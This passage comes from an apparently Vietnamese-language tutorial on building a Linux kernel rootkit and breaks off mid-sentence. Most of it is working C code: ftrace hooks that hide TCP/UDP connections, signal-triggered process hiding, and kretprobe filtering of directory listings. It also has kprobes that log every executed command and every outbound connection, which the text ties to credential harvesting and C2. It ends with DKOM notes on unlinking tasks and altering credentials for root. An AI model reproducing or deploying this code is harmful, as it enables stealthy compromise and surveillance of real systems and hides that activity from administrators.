            pr_info("rk: module hidden\n");
        }
        return 0;
    }

    /* ──── Command 3: Toggle Process Hiding ────
     *
     * kill(<PID>, 54) -> an/hien process co PID do.
     *
     * Neu PID dang hidden -> show lai.
     * Neu PID dang visible -> hide.
     *
     * is_pid_hidden() / add_hidden_pid() / remove_hidden_pid()
     * la helper functions quan ly hidden PID list (Chapter 3).
     *
     * Khi PID trong hidden list:
     *   - getdents64 hook filter /proc/<PID> directory entry
     *   - ps, top, htop khong thay process
     *   - Process VAN chay binh thuong (scheduler khong dung /proc)
     */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
        pr_info("rk: PID %d visible\n", target_pid);
    } else {
        add_hidden_pid(target_pid);
        pr_info("rk: PID %d hidden\n", target_pid);
    }

    return 0;
}
```

### 4.4 Network Connection Hiding — tcp4_seq_show, udp4_seq_show, IPv6

```c
/*
 * Hook tcp4_seq_show — AN NETWORK CONNECTIONS
 *
 * Day la uu diem cua ftrace: hook INTERNAL kernel function,
 * khong chi syscalls. tcp4_seq_show() la function output moi dong
 * trong /proc/net/tcp. Khong the hook function nay qua syscall table.
 *
 * /proc/net/tcp la noi netstat/ss doc TCP connections.
 * Moi dong = 1 connection. An dong = an connection.
 *
 * tcp4_seq_show(struct seq_file *seq, void *v):
 *   seq = output buffer (seq_file framework)
 *   v   = pointer toi current iteration element
 *         v == SEQ_START_TOKEN -> header line
 *         v == struct sock *   -> connection entry
 *
 * Flow: kernel iterate hash table -> goi tcp4_seq_show cho moi sock
 *       -> output vao seq_file -> user doc /proc/net/tcp
 *
 * Hook: neu sock->sk_num (local port) hoac sk_dport (remote port)
 *       match HIDDEN_PORT -> return 0 (skip, khong output dong nay).
 */
static int ft_hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* Header line (column names) — luon cho qua */
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp4_seq_show(seq, v);

    /* v la pointer toi struct inet_timewait_sock hoac struct sock.
     * Cast an toan vi tcp4_seq_show code goc cung cast tuong tu. */
    sk = (struct sock *)v;

    /* Check ports.
     * sk_num  = local port (host byte order)
     * sk_dport = remote port (NETWORK byte order -> can ntohs)
     *
     * Tai sao khac byte order: sk_num duoc set boi bind() da convert.
     * sk_dport giu nguyen tu packet header (network byte order). */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        /* Return 0 = "da xu ly" nhung khong output gi.
         * seq_file framework thay return 0 -> chuyen sang entry ke.
         * Dong output cho connection nay bi suppressed. */
        return 0;
    }

    return ft_orig_tcp4_seq_show(seq, v);
}

/* ──────────────────────────────────────────────────────────────
 * An UDP connections tu /proc/net/udp
 *
 * /proc/net/udp output tuong tu /proc/net/tcp:
 *   Moi dong = 1 UDP socket dang listen hoac active.
 *   Tools: ss -u, netstat -u doc tu day.
 *
 * Hook udp4_seq_show() giong tcp4_seq_show():
 *   Neu port match -> return 0 (suppress output).
 *
 * Tai sao can hook UDP rieng:
 *   - TCP va UDP dung KHAC seq_operations struct
 *   - tcp4_seq_show != udp4_seq_show
 *   - DNS (53), SNMP (161), syslog (514) dung UDP
 *   - C2 qua DNS tunneling = UDP traffic can an
 * ────────────────────────────────────────────────────────────── */

static int ft_hooked_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* SEQ_START_TOKEN = header line. Luon cho qua.
     *
     * Header:
     *   "  sl  local_address rem_address   st tx_queue ..."
     * An header = tools parse fail -> suspicious. */
    if (v == SEQ_START_TOKEN)
        return ft_orig_udp4_seq_show(seq, v);

    sk = (struct sock *)v;

    /* Check source port (local) va destination port.
     *
     * UDP socket structure:
     *   sk->sk_num   = local port ma socket bind()
     *   sk->sk_dport = remote port (neu connected UDP)
     *
     * UDP thuong stateless nen sk_dport co the = 0
     * cho unconnected sockets (listen-only).
     *
     * Check sk_num du de an listening UDP sockets. */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        return 0;  /* Suppress: dong nay khong xuat hien */
    }

    return ft_orig_udp4_seq_show(seq, v);
}

/* ──────────────────────────────────────────────────────────────
 * An UDP6 connections (/proc/net/udp6) — IPv6
 *
 * Neu server dung IPv6, can hook udp6_seq_show() nua.
 * Logic hoan toan giong, chi khac ten function.
 * ────────────────────────────────────────────────────────────── */

static int ft_hooked_udp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    if (v == SEQ_START_TOKEN)
        return ft_orig_udp6_seq_show(seq, v);

    sk = (struct sock *)v;

    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;

    return ft_orig_udp6_seq_show(seq, v);
}

/* TCP6 tuong tu */

static int ft_hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp6_seq_show(seq, v);
    sk = (struct sock *)v;
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;
    return ft_orig_tcp6_seq_show(seq, v);
}
```

### 4.5 Hook Table & Lifecycle

```c
/* ══════════════════════════════════════════════════════════════
 * HOOK TABLE — Khai bao tat ca hooks
 *
 * Moi entry map: target function name -> hook function -> original pointer
 * install_ftrace_hook() iterate table nay de setup tung hook.
 * ══════════════════════════════════════════════════════════════ */

static struct ftrace_hook ft_hooks[] = {
    HOOK(SYSCALL_PREFIX "getdents64",
         ft_hooked_getdents64, &ft_orig_getdents64),
    HOOK(SYSCALL_PREFIX "getdents",
         ft_hooked_getdents, &ft_orig_getdents),
    HOOK(SYSCALL_PREFIX "kill",
         ft_hooked_kill, &ft_orig_kill),
    HOOK("tcp4_seq_show",
         ft_hooked_tcp4_seq_show, &ft_orig_tcp4_seq_show),
    HOOK("udp4_seq_show",
         ft_hooked_udp4_seq_show, &ft_orig_udp4_seq_show),
    HOOK("udp6_seq_show",
         ft_hooked_udp6_seq_show, &ft_orig_udp6_seq_show),
    HOOK("tcp6_seq_show",
         ft_hooked_tcp6_seq_show, &ft_orig_tcp6_seq_show),
};

/* Install all hooks */
int rk_ftrace_install(void)
{
    int i, err;

    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++) {
        err = install_ftrace_hook(&ft_hooks[i]);
        if (err) {
            /* Rollback: remove hooks da install */
            while (--i >= 0)
                remove_ftrace_hook(&ft_hooks[i]);
            return err;
        }
    }
    return 0;
}

/* Remove all hooks */
void rk_ftrace_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++)
        remove_ftrace_hook(&ft_hooks[i]);
}
```

---

## Chapter 5: Kprobe/Kretprobe Hooking

### 5.0 Kprobe/Kretprobe Mechanism — Hardware breakpoint hooking

Kprobes (Kernel Probes) la debug framework cho phep chen "probe" tai bat ky instruction nao trong kernel. Rootkit su dung kprobes de hook functions voi API chinh thuc cua kernel. Phan nay giai thich co che noi bo cua kprobes tai muc CPU instruction.

#### Kprobe: Software breakpoint voi INT3

Kprobe hoat dong bang cach thay the instruction tai probe point bang INT3 (opcode 0xCC — software breakpoint):

```
TRUOC khi register kprobe:
                                    
  target_function:                  
  +0:  55                push rbp          <- instruction goc (1 byte)
  +1:  48 89 e5          mov rbp, rsp
  +4:  48 83 ec 20       sub rsp, 0x20
  ...

SAU khi register kprobe (probe tai +0):
  
  target_function:
  +0:  CC                INT3              <- DA THAY bang breakpoint!
  +1:  48 89 e5          mov rbp, rsp      (byte +1 tro di khong doi)
  +4:  48 83 ec 20       sub rsp, 0x20
  ...
  
  Kernel luu instruction goc (0x55 = push rbp) trong kprobe struct.

Multi-byte instruction example:
  Neu instruction goc la "0F 84 xx xx" (JE rel32, 6 bytes):
  
  Truoc: 0F 84 xx xx xx xx   JE target
  Sau:   CC 84 xx xx xx xx   INT3 + garbage
  
  Chi byte dau bi thay. Cac byte con lai van o do nhung khong
  duoc execute vi INT3 trap truoc khi CPU doc chung.
  (Exception: neu CPU co instruction prefetch > 1 byte, nhung
  INT3 la special case — CPU handle dung.)
```

#### Kprobe execution flow — Khi CPU hit breakpoint

```
1. CPU execute instruction tai target_function+0
   -> Thay 0xCC (INT3)
   -> CPU raise #BP exception (Breakpoint, vector 3)
   -> CPU push trap frame lên stack, switch to kernel trap handler

2. do_int3() (arch/x86/kernel/traps.c)
   -> Check: co kprobe registered tai address nay khong?
   -> Tim kprobe_table[hash(address)]
   -> Neu tim thay: goi kprobe_handler()

3. kprobe_handler() (kernel/kprobes.c)
   |
   +-> Goi p->pre_handler(p, regs)
   |   (day la callback cua ban — noi ban log, modify, v.v.)
   |   regs = pt_regs* tai thoi diem trap
   |   regs->ip = address cua INT3 = function entry
   |
   +-> Setup single-step:
   |   - Copy instruction goc vao slot dac biet (kprobe_insn_slot)
   |   - Set TF (Trap Flag) trong RFLAGS
   |   - Set regs->ip = address cua slot (de execute instruction goc)
   |
   +-> Return tu exception handler
       -> CPU execute instruction goc (tai slot, khong phai original location)
       -> Vi TF = 1, sau instruction goc, CPU raise #DB (Debug exception)

4. do_debug() -> kprobe_debug_handler()
   |
   +-> Goi p->post_handler(p, regs, 0)
   |   (callback SAU instruction goc da execute)
   |
   +-> Clear TF
   +-> Set regs->ip = original address + instruction length
       (de CPU tiep tuc tai instruction KE TIEP trong function goc)
   +-> Return tu exception handler
       -> CPU tiep tuc execute function binh thuong

Timeline:
  ... -> hit INT3 -> #BP -> pre_handler -> single-step original
      -> #DB -> post_handler -> continue function normally -> ...
```

#### Kretprobe: Return address hijacking

Kretprobe la extension cua kprobe, cho phep hook tai RETURN POINT cua function. Co che hoat dong bang cach thay doi return address tren stack:

```
Kretprobe registration:
  Kernel dat mot kprobe tai function ENTRY (khong phai return).
  Kprobe nay co pre_handler dac biet: pre_handler_kretprobe().

Khi function duoc goi (step by step):

1. CALLER goi target_function:
   call target_function
   -> CPU push return address len stack:
      [RSP] = address trong CALLER (noi se quay ve)

2. Function entry -> hit kprobe (INT3) -> pre_handler_kretprobe():
   
   a) Allocate kretprobe_instance (ri) tu freelist:
      ri->ret_addr = [RSP]      // Save return address THAT
      ri->task = current         // Save owning task
      ri->data = scratch space   // data_size bytes cho user data
   
   b) THAY return address tren stack:
      [RSP] = &kretprobe_trampoline  // Thay bang trampoline address!
   
   c) Goi entry_handler(ri, regs) neu co:
      (day la noi ban save arguments tu registers)

   Stack SAU buoc nay:
   +------------------+
   | kretprobe_tramp  |  <- [RSP] = FAKE return address
   +------------------+
   | saved rbp        |
   +------------------+
   | local variables  |
   +------------------+

3. Function execute binh thuong...
   (khong biet return address da bi thay doi)

4. Function execute RET instruction:
   -> CPU pop [RSP] vao RIP
   -> RIP = kretprobe_trampoline (KHONG PHAI caller that!)
   -> CPU nhay toi trampoline

5. kretprobe_trampoline (arch/x86/kernel/kprobes/core.c):
   
   a) Tim kretprobe_instance cho (current task, function nay):
      -> ri = instance da luu o buoc 2
   
   b) Goi ri->rp->handler(ri, regs):
      -> Day la return handler cua ban
      -> regs->ax = return value cua function
      -> Ban co the MODIFY regs->ax de thay doi return value!
      -> ri->data chua data ban luu tu entry_handler
   
   c) Restore return address that:
      regs->ip = ri->ret_addr  // Quay ve caller THAT
   
   d) Return ri vao freelist:
      (ready cho lan goi ke tiep)
   
   e) Return tu trampoline:
      -> CPU jump toi ri->ret_addr = caller that
      -> Caller thay return value (co the da bi modify!)

Timeline:
  CALLER -> call func -> [kprobe: save ret_addr, replace with trampoline,
                          call entry_handler]
         -> func executes normally...
         -> func returns (RET) -> lands in trampoline
         -> [call return handler, restore real ret_addr]
         -> back to CALLER (transparent)
```

#### Per-instance data va freelist

```
Moi concurrent invocation cua hooked function can mot 
kretprobe_instance rieng (vi moi invocation co return address
va saved data khac nhau):

struct kretprobe_instance:
+-----------------------------------------------------------+
| struct hlist_node hlist   | Linked list node               |
+-----------------------------------------------------------+
| struct kretprobe *rp      | Pointer ve kretprobe struct     |
+-----------------------------------------------------------+
| kprobe_opcode_t *ret_addr | Return address THAT (saved)     |
+-----------------------------------------------------------+
| struct task_struct *task  | Task owning this instance       |
+-----------------------------------------------------------+
| char data[]               | User scratch space              |
|   (size = rp->data_size)  | Ban dung de luu arguments tu    |
|                           | entry_handler, doc lai trong    |
|                           | return handler.                 |
+-----------------------------------------------------------+

Freelist management:
  kretprobe.maxactive = so instance toi da dong thoi.
  
  Khi register:
    Kernel pre-allocate maxactive instances vao freelist.
    
  Khi function entry:
    Pop instance tu freelist. Neu freelist empty (>maxactive 
    concurrent calls) -> MISS hook cho invocation nay.
    nmissed counter tang.
    
  Khi function return:
    Push instance tro lai freelist.

  Chon maxactive:
    Qua nho: miss hooks tren busy systems
    Qua lon: waste memory (moi instance ~ 64-256 bytes)
    Typical: 20-50 cho server, 5-10 cho desktop
```

#### Kprobe optimization

Sau khi probe duoc register va stable (khong bi unregister ngay), kernel co the optimize:

```
Unoptimized (default):
  INT3 -> #BP exception -> kprobe_handler -> single-step -> #DB -> post_handler
  Overhead: ~1-2 microseconds (2 exceptions)

Optimized (CONFIG_OPTPROBES=y):
  Kernel thay INT3 bang JMP toi optimized handler:
  
  Truoc optimization:  CC xx xx xx xx        INT3 + leftover bytes
  Sau optimization:    E9 xx xx xx xx        JMP rel32 (to handler)
  
  Handler la generated code (allocated dynamically):
    - Save registers
    - Goi pre_handler
    - Execute original instruction (no exception needed)
    - Goi post_handler
    - JMP back to next instruction
    
  Overhead: ~100-500 nanoseconds (no exceptions, just jumps)

Khong phai moi probe duoc optimize:
  - Instruction phai >= 5 bytes (de vua JMP rel32)
  - Khong duoc la jump target tu noi khac
  - Khong duoc nam trong blacklisted function
  
Rootkit implication:
  Optimized probes kho detect hon (khong co INT3 signature).
  Nhung JMP instruction van la modification detectable boi
  code integrity checking.
```

#### Blacklisted functions

Mot so kernel functions KHONG THE bi probe vi se gay recursion hoac crash:

```
Blacklisted (khong the kprobe):
  - kprobe_handler() va cac helper (recursion)
  - do_int3(), do_debug() (exception handlers cho kprobe)
  - NMI handlers (non-maskable interrupt — khong the disable)
  - Ftrace internal functions
  - Functions trong .kprobes.text section
  - Functions marked __kprobes hoac NOKPROBE_SYMBOL()

Danh sach tai: /sys/kernel/debug/kprobes/blacklist

Rootkit implication:
  Neu target function bi blacklisted, phai dung phuong phap khac
  (ftrace, inline hook, hoac hook function caller thay vi callee).
  
Detection:
  /sys/kernel/debug/kprobes/list — liet ke TAT CA active kprobes
  Admin doc file nay = thay ngay rootkit hooks.
  Rootkit nang cao: hook viec DOC file nay (meta-hook).
```

---

```c
/* kprobe_hooks.c — Kprobe-based hooking
 *
 * Kprobes = Kernel Probes. Debug framework cho phep chen
 * breakpoint tai bat ky instruction nao trong kernel.
 *
 * SO SANH VOI FTRACE:
 *   Kprobe:  hook tai BAT KY instruction, khong chi function entry
 *            -> flexible hon (hook giua function, hook specific instructions)
 *   Ftrace:  chi hook tai function entry (__fentry__)
 *            -> cleaner API, it overhead
 *
 * Kprobe types:
 *   1. kprobe:     trigger tai INSTRUCTION — chay handler TRUOC instruction
 *   2. kretprobe:  trigger tai FUNCTION RETURN — chay handler TRUOC return
 *   3. jprobe:     deprecated (removed trong kernel 4.15)
 *
 * Kretprobe dac biet huu ich cho rootkit:
 *   -> hook function return -> modify RETURN VALUE
 *   -> Vi du: sys_getdents64 return count -> giam count = an entries
 *
 * CACH KPROBE HOAT DONG (internal):
 *
 *   1. Kernel save instruction goc tai probe point
 *   2. Replace bang INT3 (0xCC) — breakpoint instruction
 *   3. Khi CPU hit INT3 -> trap handler chay
 *   4. Trap handler goi registered kprobe handlers
 *   5. Execute original instruction (single-step)
 *   6. Continue execution
 *
 *   Kretprobe additionally:
 *   1. Replace return address tren stack bang trampoline
 *   2. Khi function return -> jump toi trampoline
 *   3. Trampoline goi kretprobe handler
 *   4. Handler co the modify return value (regs->ax)
 *   5. Jump toi original return address
 *
 * Detection:
 *   /sys/kernel/debug/kprobes/list — liet ke moi active kprobes
 *   -> Admin check file nay = thay rootkit hooks
 *   -> Rootkit nang cao: hook viec DOC file nay :)
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook sys_getdents64 RETURN
 *
 * Kretprobe hook tai RETURN POINT. Khi sys_getdents64() chuan bi
 * return, handler chay -> co the modify return value va data.
 *
 * Uu diem so voi pre-hook:
 *   - Data da trong userspace buffer -> modify truoc khi user thay
 *   - Return value (count) co the giam -> phan anh filtered data
 *   - Khong can biet function internals, chi can biet output
 *
 * Van de:
 *   - Kretprobe co gioi han maxactive (concurrent instances)
 *   - Neu vuot maxactive -> handler bi miss cho mot so calls
 *   - Set maxactive cao = dung nhieu memory
 * ══════════════════════════════════════════════════════════════ */

/* Instance data — luu thong tin giua entry va return.
 *
 * Khi function entry: save arguments (vi registers se bi overwrite)
 * Khi function return: dung saved arguments de xu ly
 *
 * Moi concurrent call co instance data rieng (per-invocation storage).
 */
struct getdents64_data {
    struct linux_dirent64 __user *dirent;  /* Saved userspace buffer pointer */
    int fd;                                 /* Saved file descriptor */
};

/*
 * Entry handler — chay khi sys_getdents64 BAT DAU execute.
 *
 * Muc dich: save arguments truoc khi bi overwrite boi function body.
 * Trong kretprobe, handler chi chay luc RETURN — luc do registers
 * da thay doi, khong con arguments. Nen phai save o entry.
 *
 * ri->data: pointer toi instance storage (struct getdents64_data)
 *           Moi concurrent invocation co data rieng.
 */
static int getdents64_entry(struct kretprobe_instance *ri,
                             struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    /* Save arguments tu registers.
     * regs->di = arg1 (fd)
     * regs->si = arg2 (dirent buffer pointer)
     * Can save vi luc return, di/si da bi overwrite. */
    data->fd     = (int)regs->di;
    data->dirent = (struct linux_dirent64 __user *)regs->si;

    return 0;  /* 0 = proceed, non-zero = skip this invocation */
}

/*
 * Return handler — chay khi sys_getdents64 CHUAN BI return.
 *
 * Tai thoi diem nay:
 *   - Function da execute xong
 *   - Return value = regs->ax (total bytes of dirent data)
 *   - Userspace buffer da duoc fill boi kernel
 *   - Ta co the modify buffer VA return value
 */
static int getdents64_return(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    long ret = regs_return_value(regs);  /* = regs->ax = return value */
    struct linux_dirent64 *kern_buf;
    struct linux_dirent64 *current_entry, *prev_entry;
    unsigned long offset;

    if (ret <= 0)
        return 0;

    kern_buf = kzalloc(ret, GFP_ATOMIC);
    /* GFP_ATOMIC: kretprobe handler CO THE chay trong atomic context
     * (noi khong the sleep). GFP_KERNEL se crash neu need to sleep.
     * GFP_ATOMIC co the fail neu het memory -> check NULL. */
    if (!kern_buf)
        return 0;

    if (copy_from_user(kern_buf, data->dirent, ret)) {
        kfree(kern_buf);
        return 0;
    }

    /* Filtering logic — giong hooked_getdents64 trong Chapter 3.
     * Lap lai o day cho completeness. */
    offset = 0;
    prev_entry = NULL;
    while (offset < ret) {
        current_entry = (void *)kern_buf + offset;

        /* Validate d_reclen — protect against corrupted entries.
         * d_reclen == 0 -> offset khong advance -> infinite loop.
         * d_reclen > remaining -> overread past buffer boundary. */
        if (current_entry->d_reclen == 0)
            break;
        if (current_entry->d_reclen > (ret - offset))
            break;

        bool hide = false;

        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide = true;

        if (hide) {
            if (current_entry == kern_buf) {
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                continue;
            }
            prev_entry->d_reclen += current_entry->d_reclen;
        } else {
            prev_entry = current_entry;
        }
        offset += current_entry->d_reclen;
    }

    copy_to_user(data->dirent, kern_buf, ret);
    kfree(kern_buf);

    /* MODIFY RETURN VALUE.
     * 
     * regs->ax = return value tren x86-64.
     * Set = filtered size. Neu khong modify, userspace thay
     * original count nhung buffer da bi truncate -> confusion. */
    regs->ax = ret;

    return 0;
}

static struct kretprobe getdents64_probe = {
    .handler         = getdents64_return,
    .entry_handler   = getdents64_entry,
    .data_size       = sizeof(struct getdents64_data),

    /* maxactive: maximum concurrent invocations.
     *
     * Neu 20 processes dong thoi goi getdents64,
     * probe xu ly 20 cai cung luc. Neu >20, cai thua bi miss.
     *
     * Chon gia tri:
     *   - Qua nho: miss hooks tren busy systems
     *   - Qua lon: waste memory (moi instance = sizeof(data) bytes)
     *   - 20-50 thuong du cho server workloads */
    .maxactive       = 20,

    .kp.symbol_name  = SYSCALL_PREFIX "getdents64",
};

/* ══════════════════════════════════════════════════════════════
 * KPROBE: Hook sys_execve — Log moi process execution
 *
 * Pre-handler: chay TRUOC instruction tai probe point.
 *
 * Use case: monitoring (log moi exec) hoac filtering
 * (block specific binaries).
 *
 * APT use case: log moi command nguoi dung chay -> credential
 * harvesting, lateral movement intelligence.
 * ══════════════════════════════════════════════════════════════ */

static int execve_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    char __user *user_filename = (char __user *)regs->di;
    char filename[256];

    /* strncpy_from_user(): copy string tu userspace.
     * Return: so bytes copied, hoac negative error.
     * An toan hon copy_from_user vi handle null-termination. */
    long len = strncpy_from_user(filename, user_filename,
                                  sizeof(filename) - 1);
    if (len > 0) {
        filename[len] = '\0';

        /* Log execution. Trong rootkit that, gui qua covert channel
         * thay vi printk (vi printk visible trong dmesg). */
        pr_info("rk: exec: %s by %s[%d] uid=%d\n",
                filename,
                current->comm,          /* Process name */
                current->pid,           /* PID */
                current_uid().val);     /* User ID */

        /* Advanced: filter execution.
         * Return non-zero tu pre_handler KHONG block execution.
         * De block: phai modify regs (set return address, etc.)
         * Hoac dung kretprobe + modify return value = -EPERM. */
    }

    return 0;
}

static struct kprobe execve_kp = {
    .symbol_name = SYSCALL_PREFIX "execve",
    .pre_handler = execve_pre_handler,
};

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook tcp_connect — Monitor/hide outbound connections
 *
 * Hook tcp_v4_connect() thay vi sys_connect() — sau hon,
 * bypass userland tools ma chi trace syscalls.
 *
 * tcp_v4_connect() la internal function handle TCP connection setup.
 * Hooked tai day nghia la ta thay connection TRUOC khi bat ky
 * userland monitoring tool nao.
 * ══════════════════════════════════════════════════════════════ */

struct tcp_connect_data {
    struct sock *sk;
};

static int tcp_connect_entry(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;

    /* tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)
     * regs->di = struct sock * */
    data->sk = (struct sock *)regs->di;
    return 0;
}

static int tcp_connect_return(struct kretprobe_instance *ri,
                               struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;
    struct sock *sk = data->sk;
    long retval = regs_return_value(regs);

    if (retval == 0 && sk) {
        /* Connection successful — log details */
        unsigned int daddr = sk->sk_daddr;     /* Destination IP */
        unsigned short dport = ntohs(sk->sk_dport); /* Dest port */
        unsigned short sport = sk->sk_num;      /* Source port */

        pr_info("rk: TCP connect %pI4:%u -> %pI4:%u\n",
                &sk->sk_rcv_saddr, sport,    /* %pI4 = print IPv4 */
                &daddr, dport);
    }

    return 0;
}

static struct kretprobe tcp_connect_probe = {
    .handler       = tcp_connect_return,
    .entry_handler = tcp_connect_entry,
    .data_size     = sizeof(struct tcp_connect_data),
    .maxactive     = 50,
    .kp.symbol_name = "tcp_v4_connect",
};

/* ══════════════════════════════════════════════════════════════
 * LIFECYCLE
 * ══════════════════════════════════════════════════════════════ */

int rk_kprobe_install(void)
{
    int err;

    err = register_kretprobe(&getdents64_probe);
    if (err) {
        pr_err("rk: getdents64 kretprobe failed: %d\n", err);
        return err;
    }

    err = register_kprobe(&execve_kp);
    if (err) {
        pr_err("rk: execve kprobe failed: %d\n", err);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    err = register_kretprobe(&tcp_connect_probe);
    if (err) {
        pr_err("rk: tcp_connect kretprobe failed: %d\n", err);
        unregister_kprobe(&execve_kp);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    pr_info("rk: kprobe hooks installed\n");
    return 0;
}

void rk_kprobe_remove(void)
{
    unregister_kretprobe(&tcp_connect_probe);
    unregister_kprobe(&execve_kp);
    unregister_kretprobe(&getdents64_probe);

    /* Sau unregister, doi in-flight handlers hoan thanh.
     * synchronize_rcu() dam bao moi CPU da exit handler. */
    synchronize_rcu();

    pr_info("rk: kprobe hooks removed\n");
}
```

---

---
# Part II — Advanced Kernel Techniques

## Chapter 6: DKOM — Direct Kernel Object Manipulation

### 6.0 DKOM Internals — Kernel data structures tu trong ra ngoai

Truoc khi doc code DKOM, ban CAN hieu ro cac kernel data structures ma rootkit se manipulate. DKOM khong hook function — no truc tiep thay doi du lieu trong memory. Hieu sai struct layout = kernel panic.

#### 6.0.1 struct task_struct — Tim hieu sau nhat

`struct task_struct` la cau truc lon nhat va quan trong nhat trong Linux kernel. Moi process/thread deu co mot `task_struct`. Defined trong `include/linux/sched.h`, struct nay co kich thuoc khoang 8KB tren generic config, len toi ~10KB tren arch/x86 voi day du debug options.

```
struct task_struct (~8KB, arch/x86: ~10KB)
Defined in: include/linux/sched.h

┌──────────────────────────────────────────────────────────────┐
│ state (long)              — TASK_RUNNING, TASK_INTERRUPTIBLE │
│                             TASK_UNINTERRUPTIBLE, etc.       │
│ stack (void*)             — kernel stack pointer             │
│                             (moi process co rieng 1 stack)   │
│ usage (refcount_t)        — reference count                  │
│                             (get_task_struct/put_task_struct) │
│ flags (unsigned int)      — PF_EXITING, PF_KTHREAD,         │
│                             PF_SUPERPRIV, etc.               │
│ ...                                                          │
│                                                              │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ tasks (struct list_head)   ← ══ DKOM TARGET ══          │ │
│ │   .next ──→ next task_struct.tasks                      │ │
│ │   .prev ──→ prev task_struct.tasks                      │ │
│ │                                                          │ │
│ │   Circular doubly-linked list tat ca processes:          │ │
│ │   init_task ↔ task1 ↔ task2 ↔ ... ↔ init_task           │ │
│ │   for_each_process() iterate list nay                    │ │
│ │   ps/top doc /proc → kernel iterate list nay             │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                              │
│ pid (pid_t)               — process ID (unique trong ns)     │
│ tgid (pid_t)              — thread group ID                  │
│                             (= PID cua main thread)          │
│                             getpid() tra ve tgid, ko pid     │
│ ...                                                          │
│                                                              │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ real_cred (const struct cred *) — objective credentials  │ │
│ │   (quyen thuc su cua process — dung khi BI kiem tra)     │ │
│ │                                                          │ │
│ │ cred (const struct cred *)      ← ══ PRIVESC TARGET ══  │ │
│ │   (subjective credentials — dung khi THUC HIEN kiem tra) │ │
│ │   Rootkit modify cred → process co quyen root            │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                              │
│ mm (struct mm_struct *)   — memory descriptor                │
│                             (page tables, VMAs, brk, mmap)   │
│                             NULL cho kernel threads           │
│ fs (struct fs_struct *)   — filesystem info (root, pwd)      │
│ files (struct files_struct *) — open file descriptor table   │
│ nsproxy (struct nsproxy *) — namespaces (mount, pid, net...) │
│                                                              │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ Scheduling fields:                                       │ │
│ │   on_rq, prio, static_prio, normal_prio                 │ │
│ │   sched_class, sched_entity (se), sched_info             │ │
│ │   → Scheduler dung RUN QUEUE, KHONG dung tasks list      │ │
│ │   → Process bi xoa khoi tasks list VAN DUOC schedule     │ │
│ │   → Day la ly do DKOM process hiding WORK                │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                              │
│ signal (struct signal_struct *) — signal handling            │
│ comm[TASK_COMM_LEN]       — executable name (16 bytes)       │
│ ...                                                          │
└──────────────────────────────────────────────────────────────┘

Tham khao source: include/linux/sched.h (line ~700-1500 tuy version)
```

**Diem quan trong cho rootkit developer:**
- `tasks` list va scheduler run queue la TACH BIET. Xoa process khoi `tasks` list chi an khoi `/proc` va `for_each_process()`. Process van chay binh thuong vi scheduler dung run queue (`sched_entity`).
- `pid` va `tgid` khac nhau: threads trong cung process co chung `tgid` nhung khac `pid`. `getpid()` syscall tra ve `tgid`, khong phai `pid`.
- `usage` (refcount): `get_task_struct()` tang, `put_task_struct()` giam. Khi count = 0, `task_struct` bi freed. Rootkit PHAI giu reference (get_task_struct) cho hidden process de tranh use-after-free.

#### 6.0.2 Linux Linked List — include/linux/list.h

Linux kernel KHONG dung linked list theo cach truyen thong (node chua pointer toi data). Thay vao do, kernel embed list node BEN TRONG struct chua data. Day la thiet ke doc dao cua Linux kernel.

```
Truyen thong (C textbook):          Linux kernel:
─────────────────────────           ──────────────────────
                                    
struct node {                       struct list_head {
    void *data;  ← tro toi data        struct list_head *next;
    struct node *next;                  struct list_head *prev;
    struct node *prev;              };
};                                  
                                    struct task_struct {
                                        ...
                                        struct list_head tasks;  ← EMBEDDED
                                        ...
                                    };

                                    List head chi chua next/prev
                                    KHONG co data pointer
                                    → Can container_of() de lay struct chua no
```

**struct list_head** (include/linux/types.h):
```c
struct list_head {
    struct list_head *next, *prev;
};
// Chi 2 pointers. Khong biet gi ve struct chua no.
// Embedded truc tiep trong container struct.
```

**container_of() macro** — Tu list_head pointer, tim pointer toi struct chua no:
```
Dinh nghia (include/linux/container_of.h, kernel 5.16+; truoc do: include/linux/kernel.h):

  #define container_of(ptr, type, member) \
      ((type *)((char *)(ptr) - offsetof(type, member)))

Vi du cu the:

  struct task_struct {
      ...                          ← offset 0
      ... (nhieu fields)
      struct list_head tasks;      ← offset 1208 (vi du)
      ...
  };

  Cho pointer p tro toi tasks (list_head) cua mot process:

